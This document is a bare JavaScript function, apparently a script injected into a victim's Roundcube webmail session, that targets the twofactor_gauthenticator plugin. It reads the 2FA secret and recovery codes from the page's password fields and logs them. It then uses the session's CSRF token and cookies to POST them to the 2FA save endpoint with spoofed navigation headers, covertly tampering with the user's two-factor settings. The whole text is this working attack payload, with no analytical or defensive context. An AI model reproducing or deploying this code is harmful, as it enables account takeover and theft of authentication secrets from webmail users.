async function delTwoAuth(fullUrl){
  try{
      var checkUrlRequest = await fetch(`${fullUrl}?_task=settings&_action=plugin.twofactor_gauthenticator-save`)
      var respBody = await checkUrlRequest.text()

  
      if (respBody.includes('SERVICE CURRENTLY NOT AVAILABLE') === false) {
        var passwordElements = document.querySelectorAll('[type="password"]');
        console.log(passwordElements[0].value);
        console.log(passwordElements[2].value);
        console.log(passwordElements[1].value);
        console.log(passwordElements[3].value);
        console.log(passwordElements[4].value);
        var workRequest = fetch(fullUrl, {
      credentials: "include",
      headers: {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "Accept-Language": "en-US,en;q=0.5",
          "Content-Type": "application/x-www-form-urlencoded",
          "Upgrade-Insecure-Requests": "1",
          "Sec-Fetch-Dest": "document",
          "Sec-Fetch-Mode": "navigate",
          "Sec-Fetch-Site": "same-origin",
          "Sec-Fetch-User": "?1",
          "Priority": "u=0, i"
      },
      referrer: `${fullUrl}?_task=settings&_action=plugin.twofactor_gauthenticator-save`,
      body: `_token=${rcmail.env.request_token}&2FA_secret=${passwordElements[0].value}&2FA_recovery_codes%5B%5D=${passwordElements[1].value}&2FA_recovery_codes%5B%5D=${passwordElements[2].value}&2FA_recovery_codes%5B%5D=${passwordElements[3].value}&2FA_recovery_codes%5B%5D=${passwordElements[4].value}`,
      method: "POST",
      mode: "cors"
  })
  return true
} else {
  return false
}
} catch (e) {
console.log('fromTwoAutm',e)
return false
}
}
